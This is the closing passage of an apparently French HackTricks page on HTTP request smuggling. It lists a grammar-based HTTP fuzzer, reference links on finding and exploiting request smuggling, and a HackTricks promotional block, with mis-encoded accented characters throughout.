* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Cet outil est un Fuzzer HTTP basÃ© sur la grammaire utile pour trouver des incohÃ©rences Ã©tranges de trafic de requÃªtes.

## RÃ©fÃ©rences

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
